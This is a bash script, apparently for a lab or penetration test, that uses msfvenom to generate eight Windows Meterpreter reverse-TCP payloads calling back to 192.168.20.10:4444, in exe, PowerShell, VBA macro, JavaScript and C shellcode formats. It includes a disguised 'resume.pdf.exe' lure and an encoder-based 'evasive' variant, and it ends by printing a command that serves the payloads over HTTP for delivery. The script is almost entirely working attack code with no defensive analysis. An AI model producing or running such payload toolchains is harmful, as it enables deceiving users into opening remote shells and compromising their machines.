#!/bin/bash

# Kali Linux Payload Generation Script
# Creates multiple payload variants for testing

echo "=== Kali Linux Payload Generation ==="
echo "IP Address: 192.168.20.10"
echo "Port: 4444"
echo "================================"

# Create attacks directory
mkdir -p ~/attacks
cd ~/attacks

# 1. Basic Meterpreter Reverse TCP
echo "[1] Generating Basic Meterpreter Payload..."
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.20.10 \
    LPORT=4444 \
    -f exe \
    -o resume.pdf.exe

# 2. Encoded Meterpreter Payload
echo "[2] Generating Encoded Meterpreter Payload..."
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.20.10 \
    LPORT=4444 \
    -e x64/shikata_ga_nai \
    -i 3 \
    -f exe \
    -o evasive.pdf.exe

# 3. PowerShell Meterpreter Payload
echo "[3] Generating PowerShell Payload..."
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.20.10 \
    LPORT=4444 \
    -f psh-reflection \
    -o payload.ps1

# 4. Legacy Payload (for compatibility)
echo "[4] Generating Legacy Payload..."
msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=192.168.20.10 \
    LPORT=4444 \
    -f exe \
    -o legacy_payload.exe

# 5. VBA Macro Payload
echo "[5] Generating VBA Macro Payload..."
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.20.10 \
    LPORT=4444 \
    -f vba \
    -o malicious_macro.txt

# 6. PowerShell Encoded Payload
echo "[6] Generating Encoded PowerShell Payload..."
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.20.10 \
    LPORT=4444 \
    -f psh-cmd \
    -o encoded_payload.txt

# 7. JavaScript Payload
echo "[7] Generating JavaScript Payload..."
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.20.10 \
    LPORT=4444 \
    -f js_le \
    -o payload.js

# 8. Shellcode (Raw)
echo "[8] Generating Shellcode..."
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.20.10 \
    LPORT=4444 \
    -f c \
    -o shellcode.c

echo "================================"
echo "Payload Generation Complete!"
echo "Files located in: ~/attacks/"
ls -la ~/attacks/

echo ""
echo "=== Payload Summary ==="
echo "resume.pdf.exe   : Basic Meterpreter"
echo "evasive.pdf.exe  : Encoded Meterpreter"
echo "payload.ps1      : PowerShell Payload"
echo "legacy_payload.exe: Legacy Windows Payload"
echo "malicious_macro.txt: VBA Macro"
echo "encoded_payload.txt: Encoded PowerShell"
echo "payload.js       : JavaScript Payload"
echo "shellcode.c      : Raw Shellcode"

echo ""
echo "=== Start HTTP Server ==="
echo "python3 -m http.server 9999"
